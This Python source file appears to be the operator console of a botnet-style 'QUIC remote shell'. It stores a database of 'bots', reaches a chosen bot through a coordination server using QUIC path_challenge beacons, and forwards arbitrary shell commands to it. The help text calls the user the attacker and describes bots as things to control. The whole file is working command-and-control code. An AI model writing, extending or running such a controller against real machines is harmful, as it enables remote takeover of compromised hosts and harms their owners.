#!/usr/bin/env python3

import os
import json
import asyncio
import argparse
import uuid
# from tabulate import tabulate

from lib.tls_cert import generate_tls_certificate
from lib.beacon import transmit_beacon
from lib.shell_sender import ShellSender, change_host_if_inside_docker


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="QUIC remote shell")

    parser.add_argument("-cord_addr",
                        type=str,
                        default='localhost',
                        help="the address of the coordination server")

    parser.add_argument("-cord_port",
                        type=int,
                        default=1338,
                        help="the dest port used for coordination connection")

    parser.add_argument("-port",
                        type=int,
                        default=1337,
                        help="the local port used for as attacker request to coordination server")

    parser.add_argument("-burst",
                        type=int,
                        default=1,
                        help="number of path_challenges to send at once")

    parser.add_argument("-burst_timeout",
                        type=int,
                        default=5,
                        help="timeout between each path_challenge burst")

    args = parser.parse_args()
    return args


class NetInfo(object):
    indent = 1

    bot_database_path = "connection_data/database.json"

    def __init__(self, **kwargs):
        self.bot_list = self.__read_json_database()

    def __read_json_database(self):
        if not os.path.isfile(self.bot_database_path):
            return {}

        with open(self.bot_database_path, mode="r") as json_file:
            database = json.load(json_file)
            return database

    def __generate_random_id(self) -> str:
        unique_id = uuid.uuid4()
        return f"0{unique_id.hex[:7]}"

    def update_database(self, bot_name: str, id: str, addr: str, local_port: int):
        self.bot_list[bot_name] = {
            "id": id, "addr": addr, "local_port": local_port}

        with open(self.bot_database_path, mode="w") as json_file:
            json.dump(self.bot_list, json_file, indent=self.indent)

    def add_bot(self):
        bot_name = input("bot name: ")
        id = self.__generate_random_id()
        addr = input("addr: ")
        port = int(input("local port: "))
        self.update_database(bot_name, id, addr, port)
        # generate_tls_certificate(addr, bot_name)

    def get_bot_info(self, bot_name: str) -> dict:
        if bot_name not in self.bot_list.keys():
            print(f"The name {bot_name} doesn't exist in the database")
            return None
        return self.bot_list[bot_name]

    def show_list(self):
        print("| {:^20} | {:^20} | {:^20} | {:^20} |".format(
            "name", "id", "addr", "local_port"))
        print("|{0}+{0}+{0}+{0}|".format("-" * 22))
        for bot_name, info in self.bot_list.items():
            print("| {:^20} | {:^20} | {:^20} | {:^20} |".format(bot_name,
                                                                 info["id"],
                                                                 info["addr"],
                                                                 info["local_port"]))


class CommandParser(object):

    help = [
        "a, add     -   add new bot info to shell database",
        "l, list    -   list all possible bot to communicate with",
        "s, select  -   select bot to connect, example: s \"bot_name\"",
        "h, help    -   show this help menu"
    ]

    def __init__(self, net_info: NetInfo, cord_server, cord_port, local_port, burst, timeout):
        self.net_info = net_info
        self.sel_bot_info: dict = None
        self.shell_sender: ShellSender = None
        self.cord_server = cord_server
        self.cord_port = cord_port
        self.local_port = local_port
        self.burst = burst
        self.timeout = timeout

    async def process(self, cmd: str) -> None:
        if cmd in ["a", "add"]:
            self.net_info.add_bot()
        elif cmd in ["l", "list"]:
            self.net_info.show_list()
        elif cmd.split(' ')[0] in ["s", "select"]:
            await self.select_bot(cmd)
        elif cmd in ["h", "help"]:
            self.help_command()
        else:
            output = await self.send_command(cmd)
            print(output)

    async def select_bot(self, cmd: str):
        if len(cmd.split(' ')) == 2:
            self.sel_bot_info = self.net_info.get_bot_info(cmd.split(' ')[1])
            print(f"Connecting to {self.sel_bot_info}")
            dest_port = await self.get_dest_port(self.sel_bot_info["id"])
            dest_ip = change_host_if_inside_docker(self.sel_bot_info["addr"])
            self.shell_sender = ShellSender((dest_ip, dest_port), self.cord_port)
        else:
            self.help_command()

    async def get_dest_port(self, bot_id: str) -> int:
        challenge = f"1{bot_id[1:]}".encode()
        return await transmit_beacon((self.cord_server, self.cord_port),
                                     self.local_port,
                                     challenge,
                                     burst=self.burst,
                                     timeout=self.timeout)

    async def send_command(self, cmd: str) -> str:
        if self.shell_sender is None:
            print("Please select a bot to control")
            return ""
        return await self.shell_sender.send_command(cmd)

    @classmethod
    def help_command(cls) -> None:
        print("help:\n-----")
        for line in cls.help:
            print(line)


def main() -> None:
    args = parse_args()
    net_info = NetInfo(**vars(args))
    command_parser = CommandParser(
        net_info, args.cord_addr, args.cord_port, args.port, args.burst, args.burst_timeout)
    try:
        while True:
            command = input(">")

            asyncio.run(command_parser.process(command))

    except KeyboardInterrupt:
        print("\ngoodbye...")


if __name__ == "__main__":
    main()
